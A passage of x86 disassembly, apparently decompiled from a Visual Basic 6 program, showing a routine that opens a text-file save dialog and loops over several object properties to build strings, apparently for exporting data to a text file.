0086E78B: push var_00000488
0086E791: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0086E796: mov var_00000534, eax
0086E79C: jmp 86E7A5h
0086E79E: and var_00000534, 00000000h
0086E7A5: lea ecx, var_000000C4
0086E7AB: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086E7B0: mov var_04, 0000001Fh
0086E7B7: cmp [008F529Ch], 00000000h
0086E7BE: jnz 86E7DBh
0086E7C0: push 008F529Ch
0086E7C5: push 00440F2Ch
0086E7CA: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086E7CF: mov var_00000538, 008F529Ch
0086E7D9: jmp 86E7E5h
0086E7DB: mov var_00000538, 008F529Ch
0086E7E5: mov eax, var_00000538
0086E7EB: mov eax, [eax]
0086E7ED: mov var_0000047C, eax
0086E7F3: lea eax, var_000000C4
0086E7F9: push eax
0086E7FA: mov eax, var_0000047C
0086E800: mov eax, [eax]
0086E802: push var_0000047C
0086E808: call [eax+1Ch]
0086E80B: fclex 
0086E80D: mov var_00000480, eax
0086E813: cmp var_00000480, 00000000h
0086E81A: jnl 86E83Ch
0086E81C: push 0000001Ch
0086E81E: push 00440F1Ch
0086E823: push var_0000047C
0086E829: push var_00000480
0086E82F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0086E834: mov var_0000053C, eax
0086E83A: jmp 86E843h
0086E83C: and var_0000053C, 00000000h
0086E843: mov eax, var_000000C4
0086E849: mov var_00000484, eax
0086E84F: mov var_000002E8, 80020004h
0086E859: mov var_000002F0, 0000000Ah
0086E863: push 00000010h
0086E865: pop eax
0086E866: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086E86B: lea esi, var_000002F0
0086E871: mov edi, esp
0086E873: movsd 
0086E874: movsd 
0086E875: movsd 
0086E876: movsd 
0086E877: push var_44
0086E87A: mov eax, var_00000484
0086E880: mov eax, [eax]
0086E882: push var_00000484
0086E888: call [eax+60h]
0086E88B: fclex 
0086E88D: mov var_00000488, eax
0086E893: cmp var_00000488, 00000000h
0086E89A: jnl 86E8BCh
0086E89C: push 00000060h
0086E89E: push 00445554h
0086E8A3: push var_00000484
0086E8A9: push var_00000488
0086E8AF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0086E8B4: mov var_00000540, eax
0086E8BA: jmp 86E8C3h
0086E8BC: and var_00000540, 00000000h
0086E8C3: lea ecx, var_000000C4
0086E8C9: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086E8CE: jmp 0086F85Ah
0086E8D3: mov var_04, 00000021h
0086E8DA: cmp [008F529Ch], 00000000h
0086E8E1: jnz 86E8FEh
0086E8E3: push 008F529Ch
0086E8E8: push 00440F2Ch
0086E8ED: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086E8F2: mov var_00000544, 008F529Ch
0086E8FC: jmp 86E908h
0086E8FE: mov var_00000544, 008F529Ch
0086E908: mov eax, var_00000544
0086E90E: mov eax, [eax]
0086E910: mov var_0000047C, eax
0086E916: lea eax, var_000000C4
0086E91C: push eax
0086E91D: mov eax, var_0000047C
0086E923: mov eax, [eax]
0086E925: push var_0000047C
0086E92B: call [eax+14h]
0086E92E: fclex 
0086E930: mov var_00000480, eax
0086E936: cmp var_00000480, 00000000h
0086E93D: jnl 86E95Fh
0086E93F: push 00000014h
0086E941: push 00440F1Ch
0086E946: push var_0000047C
0086E94C: push var_00000480
0086E952: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0086E957: mov var_00000548, eax
0086E95D: jmp 86E966h
0086E95F: and var_00000548, 00000000h
0086E966: mov eax, var_000000C4
0086E96C: mov var_00000484, eax
0086E972: lea eax, var_5C
0086E975: push eax
0086E976: mov eax, var_00000484
0086E97C: mov eax, [eax]
0086E97E: push var_00000484
0086E984: call [eax+50h]
0086E987: fclex 
0086E989: mov var_00000488, eax
0086E98F: cmp var_00000488, 00000000h
0086E996: jnl 86E9B8h
0086E998: push 00000050h
0086E99A: push 00440F3Ch
0086E99F: push var_00000484
0086E9A5: push var_00000488
0086E9AB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0086E9B0: mov var_0000054C, eax
0086E9B6: jmp 86E9BFh
0086E9B8: and var_0000054C, 00000000h
0086E9BF: push 00000000h
0086E9C1: push 00000000h
0086E9C3: push var_5C
0086E9C6: push 0044558Ch ; txt
0086E9CB: push 00452FD0h ; Text Documents
0086E9D0: call 007CCC4Dh
0086E9D5: mov var_00000134, eax
0086E9DB: mov var_0000013C, 00000008h
0086E9E5: lea edx, var_0000013C
0086E9EB: lea ecx, var_58
0086E9EE: call 00410922h ; msvbvm60.dll.__vbaVarMove
0086E9F3: lea ecx, var_5C
0086E9F6: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0086E9FB: lea ecx, var_000000C4
0086EA01: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086EA06: mov var_04, 00000022h
0086EA0D: and var_000002E8, 00000000h
0086EA14: mov var_000002F0, 00008008h
0086EA1E: lea eax, var_58
0086EA21: push eax
0086EA22: lea eax, var_000002F0
0086EA28: push eax
0086EA29: call 00410868h ; msvbvm60.dll.__vbaVarTstNe
0086EA2E: movsx eax, ax
0086EA31: test eax, eax
0086EA33: jz 0086F7DAh
0086EA39: mov var_04, 00000023h
0086EA40: mov var_000002E8, 00000001h
0086EA4A: mov var_000002F0, 00000002h
0086EA54: push 00000000h
0086EA56: push 00000001h
0086EA58: push 00440E48h
0086EA5D: push 00000000h
0086EA5F: push 00000018h
0086EA61: mov eax, [ebp+08h]
0086EA64: mov eax, [eax]
0086EA66: push [ebp+08h]
0086EA69: call [eax+00000320h]
0086EA6F: push eax
0086EA70: lea eax, var_000000C4
0086EA76: push eax
0086EA77: call 00410A84h ; Set (object)
0086EA7C: push eax
0086EA7D: lea eax, var_0000013C
0086EA83: push eax
0086EA84: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086EA89: add esp, 00000010h
0086EA8C: push eax
0086EA8D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086EA92: push eax
0086EA93: lea eax, var_000000C8
0086EA99: push eax
0086EA9A: call 00410A84h ; Set (object)
0086EA9F: push eax
0086EAA0: lea eax, var_0000014C
0086EAA6: push eax
0086EAA7: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086EAAC: add esp, 00000010h
0086EAAF: push eax
0086EAB0: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0086EAB5: mov var_000002F8, eax
0086EABB: mov var_00000300, 00000003h
0086EAC5: mov var_00000308, 00000001h
0086EACF: mov var_00000310, 00000002h
0086EAD9: lea eax, var_000002F0
0086EADF: push eax
0086EAE0: lea eax, var_00000300
0086EAE6: push eax
0086EAE7: lea eax, var_00000310
0086EAED: push eax
0086EAEE: lea eax, var_000004E8
0086EAF4: push eax
0086EAF5: lea eax, var_000004D8
0086EAFB: push eax
0086EAFC: lea eax, var_30
0086EAFF: push eax
0086EB00: call 00410A3Ch ; For
0086EB05: mov var_0000050C, eax
0086EB0B: lea eax, var_000000C8
0086EB11: push eax
0086EB12: lea eax, var_000000C4
0086EB18: push eax
0086EB19: push 00000002h
0086EB1B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086EB20: add esp, 0000000Ch
0086EB23: lea eax, var_0000014C
0086EB29: push eax
0086EB2A: lea eax, var_0000013C
0086EB30: push eax
0086EB31: push 00000002h
0086EB33: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086EB38: add esp, 0000000Ch
0086EB3B: jmp 0086F711h
0086EB40: mov var_04, 00000024h
0086EB47: lea eax, var_30
0086EB4A: mov var_000002E8, eax
0086EB50: mov var_000002F0, 0000400Ch
0086EB5A: mov var_00000308, 00000001h
0086EB64: mov var_00000310, 00000003h
0086EB6E: lea eax, var_30
0086EB71: mov var_000002F8, eax
0086EB77: mov var_00000300, 0000400Ch
0086EB81: mov var_00000338, 00000002h
0086EB8B: mov var_00000340, 00000003h
0086EB95: lea eax, var_30
0086EB98: mov var_00000328, eax
0086EB9E: mov var_00000330, 0000400Ch
0086EBA8: mov var_00000368, 00000003h
0086EBB2: mov var_00000370, 00000003h
0086EBBC: lea eax, var_30
0086EBBF: mov var_00000358, eax
0086EBC5: mov var_00000360, 0000400Ch
0086EBCF: mov var_00000398, 00000004h
0086EBD9: mov var_000003A0, 00000003h
0086EBE3: lea eax, var_30
0086EBE6: mov var_00000388, eax
0086EBEC: mov var_00000390, 0000400Ch
0086EBF6: mov var_000003C8, 00000005h
0086EC00: mov var_000003D0, 00000003h
0086EC0A: lea eax, var_30
0086EC0D: mov var_000003B8, eax
0086EC13: mov var_000003C0, 0000400Ch
0086EC1D: mov var_000003F8, 00000006h
0086EC27: mov var_00000400, 00000003h
0086EC31: lea eax, var_30
0086EC34: mov var_000003E8, eax
0086EC3A: mov var_000003F0, 0000400Ch
0086EC44: mov var_00000428, 00000007h
0086EC4E: mov var_00000430, 00000003h
0086EC58: lea eax, var_30
0086EC5B: mov var_00000418, eax
0086EC61: mov var_00000420, 0000400Ch
0086EC6B: mov var_00000458, 00000008h
0086EC75: mov var_00000460, 00000003h
0086EC7F: lea eax, var_30
0086EC82: mov var_00000448, eax
0086EC88: mov var_00000450, 0000400Ch
0086EC92: push var_44
0086EC95: push 00000000h
0086EC97: push 00000000h
0086EC99: push 00440E58h
0086EC9E: push 00000010h
0086ECA0: pop eax
0086ECA1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086ECA6: lea esi, var_000002F0
0086ECAC: mov edi, esp
0086ECAE: movsd 
0086ECAF: movsd 
0086ECB0: movsd 
0086ECB1: movsd 
0086ECB2: push 00000001h
0086ECB4: push 00000000h
0086ECB6: push 00440E48h
0086ECBB: push 00000000h
0086ECBD: push 00000018h
0086ECBF: mov eax, [ebp+08h]
0086ECC2: mov eax, [eax]
0086ECC4: push [ebp+08h]
0086ECC7: call [eax+00000320h]
0086ECCD: push eax
0086ECCE: lea eax, var_000000C4
0086ECD4: push eax
0086ECD5: call 00410A84h ; Set (object)
0086ECDA: push eax
0086ECDB: lea eax, var_0000013C
0086ECE1: push eax
0086ECE2: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086ECE7: add esp, 00000010h
0086ECEA: push eax
0086ECEB: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086ECF0: push eax
0086ECF1: lea eax, var_000000C8
0086ECF7: push eax
0086ECF8: call 00410A84h ; Set (object)
0086ECFD: push eax
0086ECFE: lea eax, var_0000014C
0086ED04: push eax
0086ED05: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086ED0A: add esp, 00000020h
0086ED0D: push eax
0086ED0E: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086ED13: push eax
0086ED14: lea eax, var_000000CC
0086ED1A: push eax
0086ED1B: call 00410A84h ; Set (object)
0086ED20: push eax
0086ED21: lea eax, var_0000015C
0086ED27: push eax
0086ED28: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086ED2D: add esp, 00000010h
0086ED30: push eax
0086ED31: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086ED36: mov edx, eax
0086ED38: lea ecx, var_5C
0086ED3B: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086ED40: push eax
0086ED41: call 00410A18h ; &
0086ED46: mov edx, eax
0086ED48: lea ecx, var_60
0086ED4B: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086ED50: push eax
0086ED51: push 00445568h
0086ED56: call 00410A18h ; &
0086ED5B: mov edx, eax
0086ED5D: lea ecx, var_64
0086ED60: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086ED65: push eax
0086ED66: push 00000010h
0086ED68: pop eax
0086ED69: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086ED6E: lea esi, var_00000310
0086ED74: mov edi, esp
0086ED76: movsd 
0086ED77: movsd 
0086ED78: movsd 
0086ED79: movsd 
0086ED7A: push 00000001h
0086ED7C: push 00000010h
0086ED7E: push 00440E58h
0086ED83: push 00000010h
0086ED85: pop eax
0086ED86: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086ED8B: lea esi, var_00000300
0086ED91: mov edi, esp
0086ED93: movsd 
0086ED94: movsd 
0086ED95: movsd 
0086ED96: movsd 
0086ED97: push 00000001h
0086ED99: push 00000000h
0086ED9B: push 00440E48h
0086EDA0: push 00000000h
0086EDA2: push 00000018h
0086EDA4: mov eax, [ebp+08h]
0086EDA7: mov eax, [eax]
0086EDA9: push [ebp+08h]
0086EDAC: call [eax+00000320h]
0086EDB2: push eax
0086EDB3: lea eax, var_000000D0
0086EDB9: push eax
0086EDBA: call 00410A84h ; Set (object)
0086EDBF: push eax
0086EDC0: lea eax, var_0000016C
0086EDC6: push eax
0086EDC7: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086EDCC: add esp, 00000010h
0086EDCF: push eax
0086EDD0: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086EDD5: push eax
0086EDD6: lea eax, var_000000D4
0086EDDC: push eax
0086EDDD: call 00410A84h ; Set (object)
0086EDE2: push eax
0086EDE3: lea eax, var_0000017C
0086EDE9: push eax
0086EDEA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086EDEF: add esp, 00000020h
0086EDF2: push eax
0086EDF3: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086EDF8: push eax
0086EDF9: lea eax, var_000000D8
0086EDFF: push eax
0086EE00: call 00410A84h ; Set (object)
0086EE05: push eax
0086EE06: lea eax, var_0000018C
0086EE0C: push eax
0086EE0D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086EE12: add esp, 00000020h
0086EE15: push eax
0086EE16: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086EE1B: mov edx, eax
0086EE1D: lea ecx, var_68
0086EE20: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086EE25: push eax
0086EE26: call 00410A18h ; &
0086EE2B: mov edx, eax
0086EE2D: lea ecx, var_6C
0086EE30: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086EE35: push eax
0086EE36: push 00445568h
0086EE3B: call 00410A18h ; &
0086EE40: mov edx, eax
0086EE42: lea ecx, var_70
0086EE45: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086EE4A: push eax
0086EE4B: push 00000010h
0086EE4D: pop eax
0086EE4E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086EE53: lea esi, var_00000340
0086EE59: mov edi, esp
0086EE5B: movsd 
0086EE5C: movsd 
0086EE5D: movsd 
0086EE5E: movsd 
0086EE5F: push 00000001h
0086EE61: push 00000010h
0086EE63: push 00440E58h
0086EE68: push 00000010h
0086EE6A: pop eax
0086EE6B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086EE70: lea esi, var_00000330
0086EE76: mov edi, esp
0086EE78: movsd 
0086EE79: movsd 
0086EE7A: movsd 
0086EE7B: movsd 
0086EE7C: push 00000001h
0086EE7E: push 00000000h
0086EE80: push 00440E48h
0086EE85: push 00000000h
0086EE87: push 00000018h
0086EE89: mov eax, [ebp+08h]
0086EE8C: mov eax, [eax]
0086EE8E: push [ebp+08h]
0086EE91: call [eax+00000320h]
0086EE97: push eax
0086EE98: lea eax, var_000000DC
0086EE9E: push eax
0086EE9F: call 00410A84h ; Set (object)
0086EEA4: push eax
0086EEA5: lea eax, var_0000019C
0086EEAB: push eax
0086EEAC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086EEB1: add esp, 00000010h
0086EEB4: push eax
0086EEB5: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086EEBA: push eax
0086EEBB: lea eax, var_000000E0
0086EEC1: push eax
0086EEC2: call 00410A84h ; Set (object)
0086EEC7: push eax
0086EEC8: lea eax, var_000001AC
0086EECE: push eax
0086EECF: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086EED4: add esp, 00000020h
0086EED7: push eax
0086EED8: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086EEDD: push eax
0086EEDE: lea eax, var_000000E4
0086EEE4: push eax
0086EEE5: call 00410A84h ; Set (object)
0086EEEA: push eax
0086EEEB: lea eax, var_000001BC
0086EEF1: push eax
0086EEF2: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086EEF7: add esp, 00000020h
0086EEFA: push eax
0086EEFB: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086EF00: mov edx, eax
0086EF02: lea ecx, var_74
0086EF05: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086EF0A: push eax
0086EF0B: call 00410A18h ; &
0086EF10: mov edx, eax
0086EF12: lea ecx, var_78
0086EF15: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086EF1A: push eax
0086EF1B: push 00445568h
0086EF20: call 00410A18h ; &
0086EF25: mov edx, eax
0086EF27: lea ecx, var_7C
0086EF2A: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086EF2F: push eax
0086EF30: push 00000010h
0086EF32: pop eax
0086EF33: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086EF38: lea esi, var_00000370
0086EF3E: mov edi, esp
0086EF40: movsd 
0086EF41: movsd 
0086EF42: movsd 
0086EF43: movsd 
0086EF44: push 00000001h
0086EF46: push 00000010h
0086EF48: push 00440E58h
0086EF4D: push 00000010h
0086EF4F: pop eax
0086EF50: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086EF55: lea esi, var_00000360
0086EF5B: mov edi, esp
0086EF5D: movsd 
0086EF5E: movsd 
0086EF5F: movsd 
0086EF60: movsd 
0086EF61: push 00000001h
0086EF63: push 00000000h
0086EF65: push 00440E48h
0086EF6A: push 00000000h
0086EF6C: push 00000018h
0086EF6E: mov eax, [ebp+08h]
0086EF71: mov eax, [eax]
0086EF73: push [ebp+08h]
0086EF76: call [eax+00000320h]
0086EF7C: push eax
0086EF7D: lea eax, var_000000E8
0086EF83: push eax
0086EF84: call 00410A84h ; Set (object)
0086EF89: push eax
0086EF8A: lea eax, var_000001CC
0086EF90: push eax
0086EF91: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086EF96: add esp, 00000010h
0086EF99: push eax
0086EF9A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086EF9F: push eax
0086EFA0: lea eax, var_000000EC
0086EFA6: push eax
0086EFA7: call 00410A84h ; Set (object)
0086EFAC: push eax
0086EFAD: lea eax, var_000001DC
0086EFB3: push eax
0086EFB4: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086EFB9: add esp, 00000020h
0086EFBC: push eax
0086EFBD: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086EFC2: push eax
0086EFC3: lea eax, var_000000F0
0086EFC9: push eax
0086EFCA: call 00410A84h ; Set (object)
0086EFCF: push eax
0086EFD0: lea eax, var_000001EC
0086EFD6: push eax
0086EFD7: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086EFDC: add esp, 00000020h
0086EFDF: push eax
0086EFE0: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086EFE5: mov edx, eax
0086EFE7: lea ecx, var_80
0086EFEA: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086EFEF: push eax
0086EFF0: call 00410A18h ; &
0086EFF5: mov edx, eax
0086EFF7: lea ecx, var_00000084
0086EFFD: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F002: push eax
0086F003: push 00445568h
0086F008: call 00410A18h ; &
0086F00D: mov edx, eax
0086F00F: lea ecx, var_00000088
0086F015: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F01A: push eax
0086F01B: push 00000010h
0086F01D: pop eax
0086F01E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086F023: lea esi, var_000003A0
0086F029: mov edi, esp
0086F02B: movsd 
0086F02C: movsd 
0086F02D: movsd 
0086F02E: movsd 
0086F02F: push 00000001h
0086F031: push 00000010h
0086F033: push 00440E58h
0086F038: push 00000010h
0086F03A: pop eax
0086F03B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086F040: lea esi, var_00000390
0086F046: mov edi, esp
0086F048: movsd 
0086F049: movsd 
0086F04A: movsd 
0086F04B: movsd 
0086F04C: push 00000001h
0086F04E: push 00000000h
0086F050: push 00440E48h
0086F055: push 00000000h
0086F057: push 00000018h
0086F059: mov eax, [ebp+08h]
0086F05C: mov eax, [eax]
0086F05E: push [ebp+08h]
0086F061: call [eax+00000320h]
0086F067: push eax
0086F068: lea eax, var_000000F4
0086F06E: push eax
0086F06F: call 00410A84h ; Set (object)
0086F074: push eax
0086F075: lea eax, var_000001FC
0086F07B: push eax
0086F07C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086F081: add esp, 00000010h
0086F084: push eax
0086F085: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086F08A: push eax
0086F08B: lea eax, var_000000F8
0086F091: push eax
0086F092: call 00410A84h ; Set (object)
0086F097: push eax
0086F098: lea eax, var_0000020C
0086F09E: push eax
0086F09F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086F0A4: add esp, 00000020h
0086F0A7: push eax
0086F0A8: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086F0AD: push eax
0086F0AE: lea eax, var_000000FC
0086F0B4: push eax
0086F0B5: call 00410A84h ; Set (object)
0086F0BA: push eax
0086F0BB: lea eax, var_0000021C
0086F0C1: push eax
0086F0C2: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086F0C7: add esp, 00000020h
0086F0CA: push eax
0086F0CB: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086F0D0: mov edx, eax
0086F0D2: lea ecx, var_0000008C
0086F0D8: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F0DD: push eax
0086F0DE: call 00410A18h ; &
0086F0E3: mov edx, eax
0086F0E5: lea ecx, var_00000090
0086F0EB: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F0F0: push eax
0086F0F1: push 00445568h
0086F0F6: call 00410A18h ; &
0086F0FB: mov edx, eax
0086F0FD: lea ecx, var_00000094
0086F103: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F108: push eax
0086F109: push 00000010h
0086F10B: pop eax
0086F10C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086F111: lea esi, var_000003D0
0086F117: mov edi, esp
0086F119: movsd 
0086F11A: movsd 
0086F11B: movsd 
0086F11C: movsd 
0086F11D: push 00000001h
0086F11F: push 00000010h
0086F121: push 00440E58h
0086F126: push 00000010h
0086F128: pop eax
0086F129: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086F12E: lea esi, var_000003C0
0086F134: mov edi, esp
0086F136: movsd 
0086F137: movsd 
0086F138: movsd 
0086F139: movsd 
0086F13A: push 00000001h
0086F13C: push 00000000h
0086F13E: push 00440E48h
0086F143: push 00000000h
0086F145: push 00000018h
0086F147: mov eax, [ebp+08h]
0086F14A: mov eax, [eax]
0086F14C: push [ebp+08h]
0086F14F: call [eax+00000320h]
0086F155: push eax
0086F156: lea eax, var_00000100
0086F15C: push eax
0086F15D: call 00410A84h ; Set (object)
0086F162: push eax
0086F163: lea eax, var_0000022C
0086F169: push eax
0086F16A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086F16F: add esp, 00000010h
0086F172: push eax
0086F173: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086F178: push eax
0086F179: lea eax, var_00000104
0086F17F: push eax
0086F180: call 00410A84h ; Set (object)
0086F185: push eax
0086F186: lea eax, var_0000023C
0086F18C: push eax
0086F18D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086F192: add esp, 00000020h
0086F195: push eax
0086F196: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086F19B: push eax
0086F19C: lea eax, var_00000108
0086F1A2: push eax
0086F1A3: call 00410A84h ; Set (object)
0086F1A8: push eax
0086F1A9: lea eax, var_0000024C
0086F1AF: push eax
0086F1B0: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086F1B5: add esp, 00000020h
0086F1B8: push eax
0086F1B9: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086F1BE: mov edx, eax
0086F1C0: lea ecx, var_00000098
0086F1C6: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F1CB: push eax
0086F1CC: call 00410A18h ; &
0086F1D1: mov edx, eax
0086F1D3: lea ecx, var_0000009C
0086F1D9: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F1DE: push eax
0086F1DF: push 00445568h
0086F1E4: call 00410A18h ; &
0086F1E9: mov edx, eax
0086F1EB: lea ecx, var_000000A0
0086F1F1: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F1F6: push eax
0086F1F7: push 00000010h
0086F1F9: pop eax
0086F1FA: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086F1FF: lea esi, var_00000400
0086F205: mov edi, esp
0086F207: movsd 
0086F208: movsd 
0086F209: movsd 
0086F20A: movsd 
0086F20B: push 00000001h
0086F20D: push 00000010h
0086F20F: push 00440E58h
0086F214: push 00000010h
0086F216: pop eax
0086F217: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086F21C: lea esi, var_000003F0
0086F222: mov edi, esp
0086F224: movsd 
0086F225: movsd 
0086F226: movsd 
0086F227: movsd 
0086F228: push 00000001h
0086F22A: push 00000000h
0086F22C: push 00440E48h
0086F231: push 00000000h
0086F233: push 00000018h
0086F235: mov eax, [ebp+08h]
0086F238: mov eax, [eax]
0086F23A: push [ebp+08h]
0086F23D: call [eax+00000320h]
0086F243: push eax
0086F244: lea eax, var_0000010C
0086F24A: push eax
0086F24B: call 00410A84h ; Set (object)
0086F250: push eax
0086F251: lea eax, var_0000025C
0086F257: push eax
0086F258: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086F25D: add esp, 00000010h
0086F260: push eax
0086F261: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086F266: push eax
0086F267: lea eax, var_00000110
0086F26D: push eax
0086F26E: call 00410A84h ; Set (object)
0086F273: push eax
0086F274: lea eax, var_0000026C
0086F27A: push eax
0086F27B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086F280: add esp, 00000020h
0086F283: push eax
0086F284: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086F289: push eax
0086F28A: lea eax, var_00000114
0086F290: push eax
0086F291: call 00410A84h ; Set (object)
0086F296: push eax
0086F297: lea eax, var_0000027C
0086F29D: push eax
0086F29E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086F2A3: add esp, 00000020h
0086F2A6: push eax
0086F2A7: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086F2AC: mov edx, eax
0086F2AE: lea ecx, var_000000A4
0086F2B4: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F2B9: push eax
0086F2BA: call 00410A18h ; &
0086F2BF: mov edx, eax
0086F2C1: lea ecx, var_000000A8
0086F2C7: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F2CC: push eax
0086F2CD: push 00445568h
0086F2D2: call 00410A18h ; &
0086F2D7: mov edx, eax
0086F2D9: lea ecx, var_000000AC
0086F2DF: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F2E4: push eax
0086F2E5: push 00000010h
0086F2E7: pop eax
0086F2E8: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086F2ED: lea esi, var_00000430
0086F2F3: mov edi, esp
0086F2F5: movsd 
0086F2F6: movsd 
0086F2F7: movsd 
0086F2F8: movsd 
0086F2F9: push 00000001h
0086F2FB: push 00000010h
0086F2FD: push 00440E58h
0086F302: push 00000010h
0086F304: pop eax
0086F305: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086F30A: lea esi, var_00000420
0086F310: mov edi, esp
0086F312: movsd 
0086F313: movsd 
0086F314: movsd 
0086F315: movsd 
0086F316: push 00000001h
0086F318: push 00000000h
0086F31A: push 00440E48h
0086F31F: push 00000000h
0086F321: push 00000018h
0086F323: mov eax, [ebp+08h]
0086F326: mov eax, [eax]
0086F328: push [ebp+08h]
0086F32B: call [eax+00000320h]
0086F331: push eax
0086F332: lea eax, var_00000118
0086F338: push eax
0086F339: call 00410A84h ; Set (object)
0086F33E: push eax
0086F33F: lea eax, var_0000028C
0086F345: push eax
0086F346: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086F34B: add esp, 00000010h
0086F34E: push eax
0086F34F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086F354: push eax
0086F355: lea eax, var_0000011C
0086F35B: push eax
0086F35C: call 00410A84h ; Set (object)
0086F361: push eax
0086F362: lea eax, var_0000029C
0086F368: push eax
0086F369: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086F36E: add esp, 00000020h
0086F371: push eax
0086F372: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086F377: push eax
0086F378: lea eax, var_00000120
0086F37E: push eax
0086F37F: call 00410A84h ; Set (object)
0086F384: push eax
0086F385: lea eax, var_000002AC
0086F38B: push eax
0086F38C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086F391: add esp, 00000020h
0086F394: push eax
0086F395: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086F39A: mov edx, eax
0086F39C: lea ecx, var_000000B0
0086F3A2: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F3A7: push eax
